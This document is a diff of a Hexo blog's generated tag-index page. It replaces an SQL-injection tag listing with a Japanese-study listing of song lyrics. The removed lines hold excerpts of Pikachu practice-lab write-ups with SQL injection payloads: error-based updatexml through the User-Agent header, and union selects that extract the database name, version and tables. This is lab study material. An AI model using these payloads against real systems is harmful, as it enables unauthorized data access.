@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="zitui.fun/tags/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:url" content="zitui.fun/tags/%E6%97%A5%E8%AF%AD%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="子推">
@@ -354,117 +354,25 @@
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/article/263a2f11.html" >
+        <a class="abstract-title" href = "/article/a192b7d9.html" >
             
-                <span>Pikachu-SQL注入(三)</span>
+                <span>Unlasting</span>
         </a>
         <div class="abstract-content">
-            Pikachu-SQL注入(三)http-header注入先抓包，测试是否存在注入点用给的账号密码进行登录我们用user-agent进行测试，将内容删去，用单引号进行测试。
-
-单引号测试报错，证明这里存在SQL注入漏洞后台应该是用insert语句进行的拼接，所以我们直接拿insert注入的payload进行测试
-1&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;
-
-
-成功爆出数据库名，接下来就是表名
-payload：
-1&#39; or updatexml(1,concat(0x7e,(SELECT concat(table...
+            永远に好きなアリス・シンセシス・サーテイ
+一人きりでも平気と零れ落ちた強がり二人の眩しすぎた日がこんない悲しいヒトリで生きられるなら誰かを愛したりしないから貴方の香り　貴方の話し方今も身体中に“愛のかけら”　が残ってるよ私の願い　私の願い話ただどうか貴方もどこかで泣いていますように
+いつも新しい一歩は重くて寂しいもし生まれ変わつてももう一度貴方に出逢いたい真夏の日差し　真冬の白い雪巡る季節中に“愛のカケラ”　が舞い落ちて幸せなのに　どこかで寂しいのは貴方よりも大きな　私の愛のせい鍵は貴方が持つたまま歌う意味を失くしたカナリア暗い鳥かごの中で貴方の香り　貴方の話し方今も身体中に“愛のカケラ...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
             <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/24</span>
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/16</span>
             </div>
             <!-- tags  -->
             
             <div class= abstract-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Pikachu">Pikachu</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/article/58c90f3a.html" >
-            
-                <span>Pikachu-SQL注入(二)</span>
-        </a>
-        <div class="abstract-content">
-            Pikachu-SQL注入(二)xx型注入先用1’进行测试，返回所以我们不难猜测，在和后台交互的SQL注入语句中，参数的闭合方式为(‘$id’)我们构造如下语句进行测试，发现返回正常
-11&#39;) or 1&#x3D;1#
-可以判断我们的猜想正确
-由之前的可知字段数为2
-11&#39;) order by 2#
-回显点
-11&#39;) union select 1,2#
-
-数据库名
-11&#39;) union select 1,database()#
-
-表名、列名
-11&#39;) union select 1,group_concat(table_name) from info...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Pikachu">Pikachu</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/article/4357daed.html" >
-            
-                <span>Pikachu-SQL注入</span>
-        </a>
-        <div class="abstract-content">
-            Pikachu-SQL注入POST注入首先随便选，然后抓个包用order by 判断字段数
-我们得到字段数为2接着，我们爆出回显点
-payload:
-1id=1 and 1=2 union select 1,2 --+
-然后爆出数据库名和版本
-数据库名pikachu，版本为5.5.47payload:
-1id&#x3D;1 and 1&#x3D;2 union select database(),version() --+
-爆表名
-得到数据表httpinfomembermessageusersxssblind
-payload：
-1id&#x3D;1 and 1&#x3D;2 union ...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Pikachu">Pikachu</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "日语学习">日语学习</a>
     
 </div>
             
